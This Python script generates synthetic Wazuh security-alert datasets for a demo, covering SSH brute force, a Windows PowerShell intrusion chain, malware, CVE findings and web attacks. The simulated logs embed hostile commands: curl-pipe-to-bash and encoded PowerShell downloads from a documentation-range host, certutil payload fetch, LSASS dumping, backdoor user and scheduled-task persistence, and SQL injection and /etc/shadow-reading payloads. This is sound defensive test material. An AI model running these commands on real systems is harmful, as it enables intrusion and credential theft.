"""Generate the synthetic demo datasets in ``sample_data/``.

All data is artificial: hosts and users are invented, external IPs come from the RFC 5737
documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and hashes are
synthetic.  Custom detection rules use the 100000+ range reserved for local Wazuh rules.

    python scripts/generate_demo_data.py
"""

from __future__ import annotations

import base64
import csv
import io
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).resolve().parents[1] / "sample_data"
RNG = random.Random(42)
START = datetime(2026, 9, 30, 0, 0, tzinfo=timezone.utc)
_ID = [1790726400]

AGENTS = {
    "web-01": ("001", "10.20.1.10"),
    "db-01": ("002", "10.20.2.20"),
    "app-02": ("003", "10.20.1.12"),
    "ws-fin-07": ("004", "10.30.7.57"),
    "fs-01": ("005", "10.20.3.30"),
    "ws-hr-02": ("006", "10.30.2.12"),
    "lnx-app-03": ("007", "10.20.1.33"),
    "dc-01": ("008", "10.20.0.5"),
}


def ts(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{dt.microsecond // 1000:03d}+0000"


def alert(dt: datetime, rule_id: str, level: int, description: str, groups: list[str], agent: str,
          data: dict | None = None, full_log: str = "", mitre: list[str] | None = None, decoder: str = "",
          location: str = "", **extra) -> dict:
    _ID[0] += 1
    agent_id, agent_ip = AGENTS[agent]
    rule: dict = {"id": rule_id, "level": level, "description": description, "groups": groups, "firedtimes": 1}
    if mitre:
        rule["mitre"] = {"id": mitre}
    doc = {
        "timestamp": ts(dt),
        "rule": rule,
        "agent": {"id": agent_id, "name": agent, "ip": agent_ip},
        "manager": {"name": "wazuh-manager"},
        "id": f"{_ID[0]}.{RNG.randint(1000, 999999)}",
        "decoder": {"name": decoder or "unknown"},
        "location": location,
        "data": data or {},
    }
    if full_log:
        doc["full_log"] = full_log
    doc.update(extra)
    return doc


def syslog_prefix(dt: datetime, host: str, prog: str) -> str:
    return f"{dt.strftime('%b %d %H:%M:%S').replace(' 0', '  ', 1)} {host} {prog}[{RNG.randint(1000, 40000)}]:"


# --------------------------------------------------------------------------- brute force
def bruteforce() -> list[dict]:
    alerts = []
    attacker = "203.0.113.66"  # listed in the demo local IOC list as malicious
    names = ["admin", "root", "test", "oracle", "postgres", "ubuntu", "guest", "user", "ftp", "git", "jenkins",
             "support", "pi", "mysql", "deploy1", "www", "backup", "nagios", "tomcat", "ansible"]
    t = START + timedelta(hours=10, minutes=31)
    for i in range(147):
        dt = t + timedelta(seconds=i * 7 + RNG.randint(0, 3))
        user = names[i % len(names)]
        port = RNG.randint(30000, 65000)
        alerts.append(alert(dt, "5710", 5, "sshd: Attempt to login using a non-existent user",
                            ["syslog", "sshd", "authentication_failed", "invalid_login"], "web-01",
                            {"srcip": attacker, "srcport": str(port), "dstuser": user},
                            f"{syslog_prefix(dt, 'web-01', 'sshd')} Invalid user {user} from {attacker} port {port}",
                            ["T1110.001", "T1021.004"], "sshd", "/var/log/auth.log"))
        if i and i % 40 == 0:
            alerts.append(alert(dt, "5712", 10, "sshd: brute force trying to get access to the system. Non existent user.",
                                ["syslog", "sshd", "authentication_failures"], "web-01",
                                {"srcip": attacker, "dstuser": user}, f"{syslog_prefix(dt, 'web-01', 'sshd')} "
                                f"Invalid user {user} from {attacker} port {port}", ["T1110"], "sshd",
                                "/var/log/auth.log"))
    t2 = t + timedelta(seconds=147 * 7 + 20)
    for i in range(9):
        dt = t2 + timedelta(seconds=i * 6)
        port = RNG.randint(30000, 65000)
        alerts.append(alert(dt, "5760", 5, "sshd: authentication failed.",
                            ["syslog", "sshd", "authentication_failed"], "web-01",
                            {"srcip": attacker, "srcport": str(port), "dstuser": "deploy"},
                            f"{syslog_prefix(dt, 'web-01', 'sshd')} Failed password for deploy from {attacker} "
                            f"port {port} ssh2", ["T1110.001", "T1021.004"], "sshd", "/var/log/auth.log"))
    dt = t2 + timedelta(seconds=70)
    alerts.append(alert(dt, "5715", 3, "sshd: authentication success.",
                        ["syslog", "sshd", "authentication_success"], "web-01",
                        {"srcip": attacker, "srcport": "51522", "dstuser": "deploy"},
                        f"{syslog_prefix(dt, 'web-01', 'sshd')} Accepted password for deploy from {attacker} "
                        "port 51522 ssh2", ["T1078", "T1021"], "sshd", "/var/log/auth.log"))
    alerts.append(alert(dt + timedelta(seconds=1), "5501", 3, "PAM: Login session opened.",
                        ["pam", "syslog", "authentication_success"], "web-01", {"dstuser": "deploy"},
                        f"{syslog_prefix(dt, 'web-01', 'sshd')} pam_unix(sshd:session): session opened for user "
                        "deploy by (uid=0)", ["T1078"], "pam", "/var/log/auth.log"))
    # post-compromise activity on web-01
    dt = dt + timedelta(minutes=2)
    cmd = f"/bin/sh -c curl -s http://198.51.100.23/x.sh | bash"
    alerts.append(alert(dt, "100110", 12, "Suspicious download piped to shell (curl | bash)",
                        ["audit", "audit_command", "local", "execution"], "web-01",
                        {"srcuser": "deploy", "dstuser": "deploy", "command": cmd,
                         "audit": {"exe": "/usr/bin/curl", "execve": {"a0": cmd}}, "process": "/usr/bin/curl"},
                        f"type=EXECVE msg=audit({int(dt.timestamp())}.123:4411): argc=3 a0=\"/bin/sh\" a1=\"-c\" "
                        f"a2=\"curl -s http://198.51.100.23/x.sh | bash\"", ["T1105", "T1059.004"], "auditd",
                        "/var/log/audit/audit.log"))
    dt = dt + timedelta(minutes=1)
    alerts.append(alert(dt, "5402", 3, "Successful sudo to ROOT executed.", ["syslog", "sudo"], "web-01",
                        {"srcuser": "deploy", "dstuser": "root", "command": "/usr/sbin/useradd -m -s /bin/bash sysupd"},
                        f"{syslog_prefix(dt, 'web-01', 'sudo')} deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; "
                        "COMMAND=/usr/sbin/useradd -m -s /bin/bash sysupd", ["T1548.003"], "sudo", "/var/log/auth.log"))
    alerts.append(alert(dt + timedelta(seconds=2), "5902", 8, "New user added to the system.",
                        ["syslog", "adduser"], "web-01", {"dstuser": "sysupd"},
                        f"{syslog_prefix(dt, 'web-01', 'useradd')} new user: name=sysupd, UID=1003, GID=1003, "
                        "home=/home/sysupd, shell=/bin/bash", ["T1136"], "useradd", "/var/log/auth.log"))
    dt = dt + timedelta(minutes=3)
    alerts.append(alert(dt, "100120", 10, "Outbound connection from shell process to external host",
                        ["audit", "local", "network"], "web-01",
                        {"srcip": "10.20.1.10", "dstip": "198.51.100.23", "dstport": "4444",
                         "process": "/bin/bash", "srcuser": "deploy"},
                        f"type=SOCKADDR msg=audit({int(dt.timestamp())}.411:4502): saddr=inet host:198.51.100.23 "
                        "serv:4444 exe=/bin/bash", ["T1071", "T1571"], "auditd", "/var/log/audit/audit.log"))
    # distributed attack from a suspicious range against two other hosts, no success
    src = "192.0.2.200"
    for host in ("db-01", "app-02", "lnx-app-03"):
        base = START + timedelta(hours=RNG.randint(1, 30), minutes=RNG.randint(0, 59))
        for i in range(RNG.randint(25, 60)):
            dt = base + timedelta(seconds=i * 11)
            user = RNG.choice(["root", "admin", "oracle", "postgres", "ubuntu"])
            port = RNG.randint(30000, 65000)
            alerts.append(alert(dt, "5760", 5, "sshd: authentication failed.",
                                ["syslog", "sshd", "authentication_failed"], host,
                                {"srcip": src, "srcport": str(port), "dstuser": user},
                                f"{syslog_prefix(dt, host, 'sshd')} Failed password for {user} from {src} port {port} ssh2",
                                ["T1110.001", "T1021.004"], "sshd", "/var/log/auth.log"))
        alerts.append(alert(dt, "5763", 10, "sshd: brute force trying to get access to the system. Authentication failed.",
                            ["syslog", "sshd", "authentication_failures"], host, {"srcip": src, "dstuser": "root"},
                            f"{syslog_prefix(dt, host, 'sshd')} Failed password for root from {src} port 40022 ssh2",
                            ["T1110"], "sshd", "/var/log/auth.log"))
    return sorted(alerts, key=lambda a: a["timestamp"])


# --------------------------------------------------------------------------- powershell chain (Windows)
def powershell() -> list[dict]:
    alerts = []
    host = "ws-fin-07"
    attacker = "203.0.113.77"
    t = START + timedelta(days=1, hours=9, minutes=12)

    def win(dt, rule_id, level, desc, groups, eventdata, event_id, mitre=None, channel="Security"):
        return alert(dt, rule_id, level, desc, groups, host,
                     {"win": {"system": {"eventID": str(event_id), "channel": channel, "computer": f"{host}.corp.example",
                                         "providerName": "Microsoft-Windows-Security-Auditing"
                                         if channel == "Security" else "Microsoft-Windows-Sysmon"},
                              "eventdata": eventdata}},
                     "", mitre, "windows_eventchannel", "EventChannel")

    for i in range(14):
        dt = t + timedelta(seconds=i * 9)
        alerts.append(win(dt, "60122", 5, "Logon Failure - Unknown user or bad password",
                          ["windows", "windows_security", "authentication_failed"],
                          {"targetUserName": "j.doe", "ipAddress": attacker, "logonType": "10",
                           "workstationName": "-", "status": "0xc000006d"}, 4625, ["T1110.001"]))
    dt = t + timedelta(seconds=14 * 9)
    alerts.append(win(dt, "60204", 10, "Multiple Windows Logon Failures",
                      ["windows", "windows_security", "authentication_failures"],
                      {"targetUserName": "j.doe", "ipAddress": attacker, "logonType": "10"}, 4625, ["T1110"]))
    dt += timedelta(seconds=40)
    alerts.append(win(dt, "60106", 3, "Windows logon success",
                      ["windows", "windows_security", "authentication_success"],
                      {"targetUserName": "j.doe", "ipAddress": attacker, "logonType": "10",
                       "authenticationPackageName": "Negotiate"}, 4624, ["T1078"]))
    payload = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')"
                               .encode("utf-16-le")).decode()
    dt += timedelta(minutes=1)
    alerts.append(win(dt, "100210", 12, "Sysmon - PowerShell executed with an encoded command (hidden window)",
                      ["windows", "sysmon", "sysmon_event1", "local"],
                      {"image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                       "commandLine": f"powershell.exe -nop -w hidden -enc {payload}",
                       "parentImage": r"C:\Windows\explorer.exe", "user": r"CORP\j.doe",
                       "hashes": "SHA256=2B1F0C9A7E5D3B1A0F9E8D7C6B5A49382716051F4E3D2C1B0A99887766554433,MD5=1A2B3C4D5E6F708192A3B4C5D6E7F801"},
                      1, ["T1059.001", "T1027"], "Microsoft-Windows-Sysmon/Operational"))
    dt += timedelta(seconds=30)
    alerts.append(win(dt, "100211", 10, "Sysmon - certutil used to download a file",
                      ["windows", "sysmon", "sysmon_event1", "local"],
                      {"image": r"C:\Windows\System32\certutil.exe",
                       "commandLine": r"certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\Users\Public\proc.exe",
                       "parentImage": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "user": r"CORP\j.doe"},
                      1, ["T1105"], "Microsoft-Windows-Sysmon/Operational"))
    dt += timedelta(minutes=2)
    alerts.append(win(dt, "100212", 13, "Sysmon - Suspicious process accessed LSASS memory",
                      ["windows", "sysmon", "sysmon_event_10", "local"],
                      {"sourceImage": r"C:\Users\Public\proc.exe", "image": r"C:\Users\Public\proc.exe",
                       "targetImage": r"C:\Windows\system32\lsass.exe", "grantedAccess": "0x1010",
                       "commandLine": r"C:\Users\Public\proc.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp"},
                      10, ["T1003.001"], "Microsoft-Windows-Sysmon/Operational"))
    for i in range(6):
        dt += timedelta(seconds=60)
        alerts.append(win(dt, "100213", 8, "Sysmon - PowerShell network connection to external host",
                          ["windows", "sysmon", "sysmon_event3", "local"],
                          {"image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                           "sourceIp": "10.30.7.57", "destinationIp": "198.51.100.23", "destinationPort": "443",
                           "protocol": "tcp", "user": r"CORP\j.doe"}, 3, None, "Microsoft-Windows-Sysmon/Operational"))
    dt += timedelta(minutes=1)
    alerts.append(win(dt, "100214", 10, "Sysmon - Scheduled task created from command line",
                      ["windows", "sysmon", "sysmon_event1", "local"],
                      {"image": r"C:\Windows\System32\schtasks.exe",
                       "commandLine": r'schtasks /create /sc onlogon /tn "OneDrive Update" /tr "C:\Users\Public\proc.exe"',
                       "parentImage": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "user": r"CORP\j.doe"},
                      1, ["T1053.005"], "Microsoft-Windows-Sysmon/Operational"))
    # benign admin PowerShell elsewhere (should stay low)
    for i in range(12):
        dt = START + timedelta(hours=8 + i, minutes=5)
        alerts.append(alert(dt, "100215", 3, "Sysmon - Process creation", ["windows", "sysmon", "sysmon_event1", "local"],
                            "dc-01", {"win": {"system": {"eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational"},
                                              "eventdata": {"image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                                                            "commandLine": r"powershell.exe -File C:\Scripts\Backup-GPO.ps1",
                                                            "user": r"CORP\svc_backup"}}},
                            "", None, "windows_eventchannel", "EventChannel"))
    return sorted(alerts, key=lambda a: a["timestamp"])


# --------------------------------------------------------------------------- malware
def malware() -> list[dict]:
    alerts = []
    sha256 = "9f2b5c0e1d4a7b3c6e8f0a1b2c3d4e5f60718293a4b5c6d7e8f9012345678abc"  # demo IOC list entry
    sha1 = "5e7a1c3b9d0f2468ace13579bdf02468ace13579"
    md5 = "7d3c2b1a0f9e8d7c6b5a493827160514"
    for host, path, offset in (("fs-01", r"c:\shares\finance\invoice_2026_09.pdf.exe", 3),
                               ("ws-hr-02", r"c:\users\a.smith\downloads\invoice_2026_09.pdf.exe", 7)):
        dt = START + timedelta(hours=14 + offset, minutes=2)
        alerts.append(alert(dt, "554", 5, "File added to the system.", ["ossec", "syscheck", "syscheck_entry_added",
                                                                         "syscheck_file"], host, {},
                            f"File '{path}' added", None, "syscheck_new_entry", "syscheck",
                            syscheck={"path": path, "event": "added", "size_after": "482304", "md5_after": md5,
                                      "sha1_after": sha1, "sha256_after": sha256, "uname_after": "SYSTEM"}))
        alerts.append(alert(dt + timedelta(seconds=20), "87105", 12,
                            f"VirusTotal: Alert - {path} - 54 engines detected this file",
                            ["virustotal"], host,
                            {"integration": "virustotal",
                             "virustotal": {"found": "1", "malicious": "1", "positives": "54", "total": "72",
                                            "scan_date": "2026-09-30 13:55:11",
                                            "permalink": f"https://www.virustotal.com/gui/file/{sha256}",
                                            "source": {"file": path, "md5": md5, "sha1": sha1, "alert_id": "1.1"}}},
                            "", ["T1204.002"], "json", "virustotal"))
    dt = START + timedelta(days=1, hours=2, minutes=40)
    alerts.append(alert(dt, "510", 7, "Host-based anomaly detection event (rootcheck).", ["ossec", "rootcheck"],
                        "lnx-app-03", {"title": "Trojaned version of file detected.", "file": "/usr/bin/top"},
                        "Trojaned version of file '/usr/bin/top' detected. Signature used: 'proc\\.h|/dev/[^n]|/tmp' "
                        "(Generic).", ["T1014"], "rootcheck", "rootcheck"))
    for i in range(3):
        dt = START + timedelta(hours=6 + i * 7)
        alerts.append(alert(dt, "550", 7, "Integrity checksum changed.", ["ossec", "syscheck", "syscheck_entry_modified",
                                                                          "syscheck_file"], "lnx-app-03", {},
                            "File '/usr/bin/top' modified", None, "syscheck_integrity_changed", "syscheck",
                            syscheck={"path": "/usr/bin/top", "event": "modified", "md5_after": f"{RNG.getrandbits(128):032x}",
                                      "sha256_after": f"{RNG.getrandbits(256):064x}", "uname_after": "root"}))
    return sorted(alerts, key=lambda a: a["timestamp"])


# --------------------------------------------------------------------------- vulnerabilities + web attacks
def cve() -> dict:
    vulns = [
        ("CVE-2021-44228", 10.0, "Critical", "liblog4j2-java", "2.11.2-1", ["app-02", "lnx-app-03"],
         "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints."),
        ("CVE-2021-4034", 7.8, "High", "policykit-1", "0.105-26ubuntu1", ["web-01", "db-01", "app-02"],
         "A local privilege escalation vulnerability was found on polkit's pkexec utility."),
        ("CVE-2022-0847", 7.8, "High", "linux-image-5.15.0-25-generic", "5.15.0-25.25", ["db-01"],
         "A flaw was found in the way the flags member of the new pipe buffer structure was lacking proper initialization."),
        ("CVE-2023-4863", 8.8, "High", "libwebp7", "1.2.2-2", ["web-01", "ws-hr-02"],
         "Heap buffer overflow in libwebp allows a remote attacker to perform an out of bounds memory write via a crafted HTML page."),
        ("CVE-2023-44487", 7.5, "High", "nginx", "1.18.0-6ubuntu14", ["web-01"],
         "The HTTP/2 protocol allows a denial of service (server resource consumption) because request cancellation can reset many streams quickly."),
        ("CVE-2024-3094", 10.0, "Critical", "xz-utils", "5.6.0-0.2", ["lnx-app-03"],
         "Malicious code was discovered in the upstream tarballs of xz, starting with version 5.6.0."),
        ("CVE-2023-48795", 5.9, "Medium", "openssh-client", "1:8.9p1-3ubuntu0.1", ["web-01", "db-01", "app-02", "lnx-app-03"],
         "The SSH transport protocol with certain OpenSSH extensions allows remote attackers to bypass integrity checks (Terrapin)."),
    ]
    rule_for = {"Critical": ("23506", 13), "High": ("23505", 10), "Medium": ("23504", 7)}
    hits = []
    for cve_id, score, sev, pkg, ver, hosts, title in vulns:
        rule_id, level = rule_for[sev]
        for host in hosts:
            dt = START + timedelta(hours=RNG.randint(0, 40), minutes=RNG.randint(0, 59))
            doc = alert(dt, rule_id, level, f"{cve_id} affects {pkg.split(':')[0]}",
                        ["vulnerability-detector"], host,
                        {"vulnerability": {"cve": cve_id, "title": f"{cve_id} affects {pkg}", "severity": sev,
                                           "published": "2023-01-01", "status": "Active",
                                           "cvss": {"cvss3": {"base_score": str(score)}},
                                           "package": {"name": pkg, "version": ver, "architecture": "amd64"},
                                           "rationale": title,
                                           "reference": f"https://nvd.nist.gov/vuln/detail/{cve_id}"}},
                        "", None, "json", "vulnerability-detector")
            hits.append({"_index": "wazuh-alerts-4.x-2026.09.30", "_id": doc["id"], "_score": 1.0, "_source": doc})
    # Web attacks against web-01 from a scanner-like source
    src = "192.0.2.150"
    for i in range(36):
        dt = START + timedelta(hours=16, minutes=i // 3, seconds=(i % 3) * 15)
        path = RNG.choice(["/index.php?id=1' OR '1'='1", "/login.php?user=admin'--", "/search?q=1 UNION SELECT password FROM users",
                           "/../../etc/passwd", "/cgi-bin/test.cgi?cmd=;cat /etc/shadow"])
        code = "200" if i == 20 else RNG.choice(["400", "403", "404"])
        rule = ("31106", 12, "A web attack returned code 200 (success).") if code == "200" else \
            (("31103", 7, "SQL injection attempt.") if "'" in path or "UNION" in path else ("31104", 6, "Common web attack."))
        doc = alert(dt, rule[0], rule[1], rule[2], ["web", "accesslog", "attack"] +
                    (["sql_injection"] if rule[0] == "31103" else []), "web-01",
                    {"srcip": src, "protocol": "GET", "url": path, "id": code},
                    f'{src} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {path} HTTP/1.1" {code} 512 "-" "sqlmap/1.7"',
                    ["T1190"], "web-accesslog", "/var/log/nginx/access.log")
        hits.append({"_index": "wazuh-alerts-4.x-2026.09.30", "_id": doc["id"], "_score": 1.0, "_source": doc})
    return {"took": 12, "timed_out": False, "hits": {"total": {"value": len(hits), "relation": "eq"}, "hits": hits}}


# --------------------------------------------------------------------------- normal activity
def normal() -> list[dict]:
    alerts = []
    users = ["a.smith", "b.jones", "c.kim", "d.ivanova", "svc_backup", "admin.ops"]
    linux_hosts = ["web-01", "db-01", "app-02", "lnx-app-03"]
    for i in range(1400):
        dt = START + timedelta(seconds=RNG.randint(0, 45 * 3600 + 45 * 60))
        host = RNG.choice(linux_hosts)
        user = RNG.choice(users)
        kind = RNG.random()
        if kind < 0.35:
            alerts.append(alert(dt, "5501", 3, "PAM: Login session opened.", ["pam", "syslog", "authentication_success"],
                                host, {"dstuser": user}, f"{syslog_prefix(dt, host, 'sshd')} pam_unix(sshd:session): "
                                f"session opened for user {user} by (uid=0)", ["T1078"], "pam", "/var/log/auth.log"))
        elif kind < 0.65:
            alerts.append(alert(dt, "5502", 3, "PAM: Login session closed.", ["pam", "syslog"], host, {"dstuser": user},
                                f"{syslog_prefix(dt, host, 'sshd')} pam_unix(sshd:session): session closed for user {user}",
                                None, "pam", "/var/log/auth.log"))
        elif kind < 0.75:
            ip = f"10.40.{RNG.randint(1, 20)}.{RNG.randint(2, 250)}"
            alerts.append(alert(dt, "5715", 3, "sshd: authentication success.", ["syslog", "sshd", "authentication_success"],
                                host, {"srcip": ip, "dstuser": user},
                                f"{syslog_prefix(dt, host, 'sshd')} Accepted publickey for {user} from {ip} port 52211 ssh2",
                                ["T1078", "T1021"], "sshd", "/var/log/auth.log"))
        elif kind < 0.85:
            cmd = RNG.choice(["/usr/bin/apt update", "/usr/bin/systemctl restart nginx", "/usr/bin/journalctl -xe"])
            alerts.append(alert(dt, "5402", 3, "Successful sudo to ROOT executed.", ["syslog", "sudo"], host,
                                {"srcuser": "admin.ops", "dstuser": "root", "command": cmd},
                                f"{syslog_prefix(dt, host, 'sudo')} admin.ops : TTY=pts/1 ; PWD=/home/admin.ops ; "
                                f"USER=root ; COMMAND={cmd}", ["T1548.003"], "sudo", "/var/log/auth.log"))
        elif kind < 0.92:
            path = RNG.choice(["/etc/nginx/nginx.conf", "/etc/hosts", "/usr/lib/x86_64-linux-gnu/libssl.so.3",
                               "/etc/apt/sources.list"])
            alerts.append(alert(dt, "550", 7, "Integrity checksum changed.", ["ossec", "syscheck",
                                                                              "syscheck_entry_modified", "syscheck_file"],
                                host, {}, f"File '{path}' modified", None, "syscheck_integrity_changed", "syscheck",
                                syscheck={"path": path, "event": "modified", "uname_after": "root",
                                          "sha256_after": f"{RNG.getrandbits(256):064x}"}))
        elif kind < 0.97:
            alerts.append(alert(dt, "19007", 7, "CIS Ubuntu Linux 22.04 LTS Benchmark: Ensure SSH root login is disabled.",
                                ["sca"], host, {"sca": {"type": "check", "check": {"result": "failed",
                                                                                     "title": "Ensure SSH root login is disabled"}}},
                                "", None, "sca", "sca"))
        else:
            alerts.append(alert(dt, "503", 3, "Wazuh agent started.", ["ossec"], host, {},
                                f"ossec: Agent started: '{host}->any'.", None, "ossec", "wazuh-agent"))
    # internal vulnerability scanner hitting SSH every 15 minutes exactly -> periodic (likely false positive)
    for i in range(160):
        dt = START + timedelta(minutes=15 * i)
        host = linux_hosts[i % len(linux_hosts)]
        alerts.append(alert(dt, "5710", 5, "sshd: Attempt to login using a non-existent user",
                            ["syslog", "sshd", "authentication_failed", "invalid_login"], host,
                            {"srcip": "10.10.5.5", "dstuser": "scan_probe"},
                            f"{syslog_prefix(dt, host, 'sshd')} Invalid user scan_probe from 10.10.5.5 port 40000",
                            ["T1110.001", "T1021.004"], "sshd", "/var/log/auth.log"))
    # firewall background noise from the Internet
    for i in range(220):
        dt = START + timedelta(seconds=RNG.randint(0, 45 * 3600))
        src = f"198.51.100.{RNG.randint(100, 250)}"
        alerts.append(alert(dt, "4101", 5, "Firewall drop event.", ["firewall"], "web-01",
                            {"srcip": src, "dstip": "10.20.1.10", "dstport": str(RNG.choice([23, 445, 3389, 8080])),
                             "protocol": "TCP", "action": "DROP"},
                            f"{syslog_prefix(dt, 'web-01', 'kernel')} [UFW BLOCK] IN=eth0 SRC={src} DST=10.20.1.10 PROTO=TCP",
                            None, "iptables", "/var/log/kern.log"))
    return sorted(alerts, key=lambda a: a["timestamp"])


# --------------------------------------------------------------------------- other formats
def alerts_log() -> str:
    lines = []
    t = START + timedelta(hours=20)
    for i in range(6):
        dt = t + timedelta(seconds=i * 4)
        alert_id = f"{int(dt.timestamp())}.{1000 + i}"
        lines += [
            f"** Alert {alert_id}: - syslog,sshd,authentication_failed,",
            f"{dt.strftime('%Y %b %d %H:%M:%S')} (app-02) 10.20.1.12->/var/log/auth.log",
            "Rule: 5760 (level 5) -> 'sshd: authentication failed.'",
            "Src IP: 192.0.2.201",
            "User: oracle",
            f"{syslog_prefix(dt, 'app-02', 'sshd')} Failed password for oracle from 192.0.2.201 port 4{i}112 ssh2",
            "",
        ]
    return "\n".join(lines) + "\n"


def csv_export() -> str:
    buf = io.StringIO()
    writer = csv.writer(buf)
    writer.writerow(["timestamp", "agent.name", "agent.ip", "rule.id", "rule.level", "rule.description",
                     "rule.groups", "data.srcip", "data.dstuser", "rule.mitre.id", "full_log"])
    t = START + timedelta(hours=22)
    for i in range(8):
        dt = t + timedelta(minutes=i)
        writer.writerow([ts(dt), "dc-01", "10.20.0.5", "60122", "5", "Logon Failure - Unknown user or bad password",
                         "windows, windows_security, authentication_failed", "10.30.2.12", "svc_sql",
                         '["T1110.001"]', "An account failed to log on."])
    return buf.getvalue()


def cef_lines() -> str:
    t = START + timedelta(hours=23)
    out = []
    for i in range(4):
        dt = t + timedelta(minutes=i * 2)
        out.append(f"{dt.strftime('%b %d %H:%M:%S')} fw-edge-01 CEF:0|DemoVendor|EdgeFirewall|9.1|4100|"
                   f"Port scan detected|7|src=192.0.2.210 dst=10.20.1.10 dpt={22 + i} act=blocked "
                   f"rt={int(dt.timestamp() * 1000)} msg=Multiple ports probed from single source")
    return "\n".join(out) + "\n"


def xml_export() -> str:
    t = START + timedelta(hours=23, minutes=30)
    items = []
    for i in range(3):
        dt = t + timedelta(minutes=i)
        items.append(f"""  <alert>
    <timestamp>{ts(dt)}</timestamp>
    <rule id="5402" level="3"><description>Successful sudo to ROOT executed.</description>
      <groups><group>syslog</group><group>sudo</group></groups></rule>
    <agent id="002" name="db-01" ip="10.20.2.20"/>
    <data><srcuser>admin.ops</srcuser><dstuser>root</dstuser><command>/usr/bin/systemctl status postgresql</command></data>
    <full_log>admin.ops : TTY=pts/0 ; PWD=/home/admin.ops ; USER=root ; COMMAND=/usr/bin/systemctl status postgresql</full_log>
  </alert>""")
    return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<alerts>\n" + "\n".join(items) + "\n</alerts>\n"


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    # alerts.json style (one alert per line)
    (OUT / "sample_bruteforce.json").write_text("\n".join(json.dumps(a) for a in bruteforce()) + "\n", encoding="utf-8")
    # pretty-printed JSON array
    (OUT / "sample_powershell.json").write_text(json.dumps(powershell(), indent=2), encoding="utf-8")
    (OUT / "sample_malware.json").write_text(json.dumps(malware(), indent=2), encoding="utf-8")
    # Wazuh indexer / OpenSearch export wrapper
    (OUT / "sample_cve.json").write_text(json.dumps(cve(), indent=1), encoding="utf-8")
    (OUT / "sample_normal_activity.json").write_text("\n".join(json.dumps(a) for a in normal()) + "\n",
                                                      encoding="utf-8")
    extra = OUT / "formats"
    extra.mkdir(exist_ok=True)
    (extra / "sample_alerts.log").write_text(alerts_log(), encoding="utf-8")
    (extra / "sample_export.csv").write_text(csv_export(), encoding="utf-8")
    (extra / "sample_firewall.cef").write_text(cef_lines(), encoding="utf-8")
    (extra / "sample_export.xml").write_text(xml_export(), encoding="utf-8")
    print(f"Demo data written to {OUT}")


if __name__ == "__main__":
    main()
